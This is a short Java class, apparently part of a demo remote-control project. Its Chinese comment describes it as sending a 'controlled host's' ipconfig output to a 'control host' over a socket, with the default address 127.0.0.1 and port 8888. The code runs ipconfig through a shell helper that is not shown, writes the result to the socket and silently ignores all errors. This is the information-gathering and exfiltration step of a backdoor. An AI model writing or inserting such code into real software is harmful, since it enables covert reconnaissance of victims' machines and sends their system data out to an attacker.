package com.demo.model;

import java.io.PrintWriter;
import java.net.Socket;

/**
 * 向控制主机发起一个socket连接，发送受控主机的 ipconfig 信息
 * 
 * 默认请求地址 127.0.0.1
 * 默认请求端口 8888
 */
public class InfoSender{
    private static final String MY_SERVER = "127.0.0.1";
    private static final int PORT = 8888;
    
    public static void send(){
        try(var s = new Socket(MY_SERVER, PORT);
            var writer = new PrintWriter(s.getOutputStream())){
            var ipInfo = new ShellRunner("NULL").runShell("ipconfig");
            writer.println(ipInfo);
        }catch(Exception ignored){;}
    }
}